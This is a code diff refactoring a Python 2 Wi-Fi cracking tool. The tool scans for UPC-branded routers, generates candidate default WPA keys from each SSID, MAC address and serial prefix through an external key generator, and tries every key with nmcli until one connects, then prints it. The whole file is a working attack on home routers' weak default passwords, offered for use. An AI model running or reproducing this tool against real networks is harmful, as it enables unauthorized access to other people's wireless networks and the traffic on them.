@@ -1,10 +1,3 @@
-'''
-
-Recently used or known WIFI networks will auto-connect and fuck up the program logic (key found - wrong)
-reduce the globals madness
-
-'''
-
 from time import sleep
 from subprocess import CalledProcessError
 import subprocess
@@ -13,14 +6,6 @@ import os
 import sys
 import time
 
-ap_list = []
-mac_list = []
-ghz = 24
-whatyearisit = 0
-wifi_interface = ''
-cntaps = 0
-allkeys = 0
-
 HEADER = '\033[95m'
 OKGREEN = '\033[92m'
 WARNING = '\033[93m'
@@ -28,72 +13,76 @@ FAIL = '\033[91m'
 ENDC = '\033[0m'
 
 
-class upwn:
-    '''
-    PROGRAM LOGIC, function calls
-    '''
-    def menu(self):
+class Upwn(object):
+    ap_list = []
+    mac_list = []
+    ghz = 24
+    whatyearisit = 0
+    wifi_interface = ''
+    cntaps = 0
+    allkeys = 0
 
-        global wifi_interface
-        global cntaps
-        global allkeys
+    """
+    PROGRAM LOGIC, function calls
+    """
+    @staticmethod
+    def menu():
         isubee = 0
 
-        upwn().checkroot()
-        upwn().banner()
-        aps, macs, ubees = upwn().getaps()
-        upwn().getsetiface()
-        listnr = upwn().setap(aps, macs)
+        Upwn.checkroot()
+        Upwn.banner()
+        aps, macs, ubees = Upwn.getaps()
+        Upwn.getsetiface()
+        listnr = Upwn.setap(aps, macs)
 
         for item in ubees:
             if item == listnr:
                 isubee = 1
                 print OKGREEN + '[+] ' + "UBEE router detected" + ENDC
 
-        prefix = upwn().serials()
+        prefix = Upwn.serials()
 
-        ubeekeys = upwn().gen_keys(listnr, 'UAAP')
-        upwn().setghz()
-        keys = upwn().gen_keys(listnr, prefix)
+        ubeekeys = Upwn.gen_keys(listnr, 'UAAP')
+        Upwn.setghz()
+        keys = Upwn.gen_keys(listnr, prefix)
 
         print OKGREEN + "\nAvailable keys:" + ENDC
 
         if isubee:
             for item in ubeekeys:
                 print OKGREEN + '[+] ' + ENDC + item
-                allkeys += 1
+                Upwn.allkeys += 1
         else:
             ubeekeys = []
 
         for item in keys:
             print OKGREEN + '[+] ' + ENDC + item
-            allkeys += 1
+            Upwn.allkeys += 1
 
-        upwn().pretest(listnr, keys, ubeekeys)
-        upwn().deadend()
+        Upwn.pretest(listnr, keys, ubeekeys)
+        Upwn.deadend()
 
     '''
     DEADEND
     '''
-    def deadend(self):
-        global allkeys, whatyearisit
-        allkeys = 0
-        whatyearisit = 0
+    @staticmethod
+    def deadend():
+        Upwn.allkeys = 0
+        Upwn.whatyearisit = 0
 
-        upwn().fail()
+        Upwn.fail()
         response = raw_input(WARNING + "\nRetry? (Y/n): " + ENDC)
 
         if response in 'Yy' or '':
-            upwn().menu()
+            Upwn.menu()
         else:
             exit(0)
 
     '''
     SET GHZ
     '''
-    def setghz(self):
-        global ghz
-
+    @staticmethod
+    def setghz():
         print OKGREEN + "\nAvailable band options:" + ENDC
         print "[0] 2.4 Ghz (default)"
         print "[1] 5 Ghz"
@@ -102,16 +91,16 @@ class upwn:
         response = raw_input(WARNING + "\nselect band: " + ENDC)
 
         if response == '':
-            ghz = 1
+            Upwn.ghz = 1
             print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
         elif int(response) == 0:
-            ghz = 1
+            Upwn.ghz = 1
             print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
         elif int(response) == 1:
-            ghz = 2
+            Upwn.ghz = 2
             print OKGREEN + "[+] " + ENDC + "5 Ghz selected\n"
         elif int(response) == 2:
-            ghz = 3
+            Upwn.ghz = 3
             print OKGREEN + "[+] " + ENDC + "2.4 + 5 Ghz selected\n"
         else:
             print "Your answer was bad and you should feel bad"
@@ -120,44 +109,41 @@ class upwn:
     '''
     SET AP
     '''
-    def setap(self, aps, macs):
-        global cntaps
-
+    @staticmethod
+    def setap(aps, macs):
         print OKGREEN + "\nAvailable UPC routers:" + ENDC
         i = 0
         for item in aps:
-            ap_list.append(item)
+            Upwn.ap_list.append(item)
             if i == 0:
                 print "[" + str(i) + "] " + str(item) + " (default)"
             else:
                 print "[" + str(i) + "] " + str(item)
-            cntaps += 1
+            Upwn.cntaps += 1
             i += 1
 
         for item in macs:
-            mac_list.append(item)
+            Upwn.mac_list.append(item)
 
         listnr = 0
         response = raw_input(WARNING + "\nselect router: " + ENDC)
 
         if response == '':
-            print OKGREEN + "[+] " + ENDC + ap_list[listnr] + " selected"
-        elif int(response) <= cntaps:
+            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
+        elif int(response) <= Upwn.cntaps:
             listnr = int(response)
-            print OKGREEN + "[+] " + ENDC + ap_list[listnr] + " selected"
+            print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + " selected"
         else:
             print "Your answer was bad and you should feel bad"
             exit(1)
 
         return listnr
 
-
     '''
     SET WIFI INTERFACE
     '''
-    def getsetiface(self):
-        global wifi_interface
-
+    @staticmethod
+    def getsetiface():
         print OKGREEN + "Wifi Interfaces found:" + ENDC
 
         iwconfig = subprocess.check_output("iwconfig", stderr=open(os.devnull, 'w'))
@@ -175,21 +161,22 @@ class upwn:
         response = raw_input(WARNING + "\nselect interface: " + ENDC)
 
         if response == '':
-            wifi_interface = interfaces[0]
+            Upwn.wifi_interface = interfaces[0]
 
         elif response in '012345':
-            wifi_interface = interfaces[int(response)]
+            Upwn.wifi_interface = interfaces[int(response)]
 
         else:
             print "go away"
             exit(1)
 
-        print OKGREEN + "[+]" + ENDC + " testing via " + str(wifi_interface) + "\n"
+        print OKGREEN + "[+]" + ENDC + " testing via " + str(Upwn.wifi_interface) + "\n"
 
     '''
     GET APs
     '''
-    def getaps(self):
+    @staticmethod
+    def getaps():
         nmcli = subprocess.check_output(["nmcli", "-f", "SSID,BSSID", "d", "wifi"], stderr=open(os.devnull, 'w'))
         aps_macs = re.compile('(UPC+\d{7}).+(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)').findall(nmcli)
 
@@ -206,7 +193,6 @@ class upwn:
                 ubees.append(cnt)
             cnt += 1
 
-
         # exit if no UPC router is found
         if not aps:
             print FAIL + "[!] No vulnerable UPC routers found!" + ENDC
@@ -220,27 +206,28 @@ class upwn:
     '''
     TEST THE KEYS?
     '''
-    def pretest(self, listnr, keys, ubeekeys):
-
-        response = raw_input(WARNING + "\nTry " + str(allkeys) + " keys now? [" + ap_list[listnr] + "] (Y/n): " + ENDC)
+    @staticmethod
+    def pretest(listnr, keys, ubeekeys):
+        response = raw_input(WARNING + "\nTry " + str(Upwn.allkeys) + " keys now? [" + Upwn.ap_list[listnr] +
+                             "] (Y/n): " + ENDC)
 
         if response in 'Yy' or '':
 
             if keys and ubeekeys:
-                upwn().keytest(listnr, ubeekeys, wifi_interface)
-                upwn().keytest(listnr, keys, wifi_interface)
+                Upwn.keytest(listnr, ubeekeys, Upwn.wifi_interface)
+                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
             elif ubeekeys:
-                upwn().keytest(listnr, ubeekeys, wifi_interface)
+                Upwn.keytest(listnr, ubeekeys, Upwn.wifi_interface)
             else:
-                upwn().keytest(listnr, keys, wifi_interface)
+                Upwn.keytest(listnr, keys, Upwn.wifi_interface)
         else:
             exit(0)
 
     '''
     SET PREFIX
     '''
-    def serials(self):
-
+    @staticmethod
+    def serials():
         print OKGREEN + "\n\nAvailable serial prefixes:" + ENDC
         print "[0] SAAP (default)"
         print "[1] SAPP"
@@ -278,12 +265,11 @@ class upwn:
     '''
     NMCLI MAGIC
     '''
-    def keytest(self, aplistnr, key, interface):
-
-        global whatyearisit
-
+    @staticmethod
+    def keytest(aplistnr, key, interface):
         cnt = 0
-        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', ap_list[aplistnr]], stderr=open(os.devnull, 'wb'))
+        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
+                         stderr=open(os.devnull, 'wb'))
 
         for item in key:
             cnt += 1
@@ -291,34 +277,36 @@ class upwn:
             sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
             sleep(2)
 
-            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', ap_list[aplistnr], 'password', item, 'iface', interface], stderr=open(os.devnull, 'wb'))
+            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item,
+                                  'iface', interface], stderr=open(os.devnull, 'wb'))
             streamdata = p.communicate()[0]
 
-            upwn().waiter(5)
+            Upwn.waiter(5)
 
             if p.returncode == 0:
-                whatyearisit += (time.time() - start_time)
-                upwn().win(aplistnr, item)
+                Upwn.whatyearisit += (time.time() - start_time)
+                Upwn.win(aplistnr, item)
 
             sys.stdout.write(FAIL + "[X]" + ENDC)
-            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', ap_list[aplistnr]], stderr=open(os.devnull, 'wb'))
+            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
+                             stderr=open(os.devnull, 'wb'))
 
-            whatyearisit += (time.time() - start_time)
-            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(allkeys) + "]")
+            Upwn.whatyearisit += (time.time() - start_time)
+            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(Upwn.allkeys) + "]")
         print
 
     '''
     GET KEYS
     '''
-    def gen_keys(self, aplistnr, prefix):
-        global allkeys
+    @staticmethod
+    def gen_keys(aplistnr, prefix):
         keys = []
         found = 0
         ubeekeys = ''
 
         # UAAP == UBEE
         if prefix == "UAAP":
-            mac = str(mac_list[aplistnr]).replace(':', '')[6:]
+            mac = str(Upwn.mac_list[aplistnr]).replace(':', '')[6:]
 
             # hack for non zero return
             try:
@@ -328,7 +316,7 @@ class upwn:
 
             ubeelines = ubee.splitlines()
             for line in ubeelines:
-                if ap_list[aplistnr] in line:
+                if Upwn.ap_list[aplistnr] in line:
                     ubeekeys = re.compile('([A-Z]{8})').findall(line)
                     found += 1
 
@@ -337,9 +325,10 @@ class upwn:
             return ubeekeys
 
         # the rest
-        output = subprocess.check_output(["./upc_keys_lambda", ap_list[aplistnr], prefix], stderr=open(os.devnull, 'w')).replace('\'', '')
+        output = subprocess.check_output(["./upc_keys_lambda", Upwn.ap_list[aplistnr], prefix],
+                                         stderr=open(os.devnull, 'w')).replace('\'', '')
         lines = output.splitlines()
-        keys_ = (upwn().key_collector(lines))
+        keys_ = (Upwn.key_collector(lines))
 
         for item in keys_:
             keys.append(item)
@@ -348,10 +337,11 @@ class upwn:
     '''
     COLLECT KEYS
     '''
-    def key_collector(self, keys):
+    @staticmethod
+    def key_collector(keys):
         collect = []
 
-        if ghz == 3:
+        if Upwn.ghz == 3:
             for item in keys:
                 parts = item.split(',')
                 collect.append(parts[1])
@@ -359,14 +349,15 @@ class upwn:
         else:
             for item in keys:
                 parts = item.split(',')
-                if parts[2] == str(ghz):
+                if parts[2] == str(Upwn.ghz):
                     collect.append(parts[1])
         return collect
 
     '''
     WAIT FOR IT.. now with dots
     '''
-    def waiter(self, howlong):
+    @staticmethod
+    def waiter(howlong):
         i = 1
         while i <= howlong:
             sys.stdout.write('.')
@@ -377,17 +368,17 @@ class upwn:
     '''
     ARE YOU ROOT?
     '''
-    def checkroot(self):
+    @staticmethod
+    def checkroot():
         if os.getuid() != 0:
             print "You need root permissions to run this program"
             sys.exit(1)
 
-
-
     '''
     DEAD
     '''
-    def fail(self):
+    @staticmethod
+    def fail():
         print "          _____                    _____                    _____                    _____           "
         print "         /\    \                  /\    \                  /\    \                  /\    \          "
         print "        /::\    \                /::\    \                /::\    \                /::\    \         "
@@ -413,7 +404,8 @@ class upwn:
     '''
     START THE ENGINES
     '''
-    def banner(self):
+    @staticmethod
+    def banner():
         print WARNING + "           _________   _...._                      _..._   "
         print "           \        |.'      '-.         _     _ .'     '. "
         print "            \        .'```'.    '. /\    \\\\   //.   .-.   ."
@@ -430,7 +422,8 @@ class upwn:
     '''
     WE WIN THIS TIME
     '''
-    def win(self, aplistnr, key):
+    @staticmethod
+    def win(aplistnr, key):
         print '\n\n'
         print '   $$$$$\   $$$$$$\    $$$$$$\  $$\    $$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ '
         print '   \__$$ | $$  __$$\  $$  __$$\ $$ |  $$  |$$  __$$\ $$  __$$\\\\__$$  __|'
@@ -442,12 +435,8 @@ class upwn:
         print ' \______ / \__|  \__|  \______/ \__|   \__|\__|       \______ /  \__|'
 
         print "\n\n"
-        print "Key to the kingdom of " + ap_list[aplistnr] + ":\t" + key
-        print "\n\nThe castle was defeated in " + str(whatyearisit) + " seconds"
+        print "Key to the kingdom of " + Upwn.ap_list[aplistnr] + ":\t" + key
+        print "\n\nThe castle was defeated in " + str(Upwn.whatyearisit) + " seconds"
         exit(0)
 
-
-'''
-LETS GET THIS STARTED
-'''
-upwn().menu()
+Upwn.menu()
